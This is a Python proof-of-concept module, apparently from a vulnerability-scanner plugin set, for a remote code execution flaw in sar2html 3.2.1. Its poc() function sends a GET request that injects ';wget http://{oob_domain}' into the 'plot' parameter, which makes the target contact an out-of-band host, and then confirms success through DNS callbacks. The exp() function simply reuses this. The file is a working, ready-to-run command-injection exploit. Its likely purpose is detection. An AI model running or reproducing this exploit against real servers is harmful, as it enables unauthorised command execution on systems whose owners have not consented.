import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''sar2html 3.2.1 - 'plot' Remote Code Execution''',
        "description": '''SAR2HTML could allow a remote attacker to execute arbitrary commands on the system, caused by a command injection flaw in the index.php script. By sending specially-crafted commands, an attacker could exploit this vulnerability to execute arbitrary commands on the system.''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/49344"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["sar2html", "rce", "oast"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/index.php?plot=;wget%20http://{oob_domain}""".format(oob_domain=oob_domain)
        method = "GET"
        data = """"""
        headers = {'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url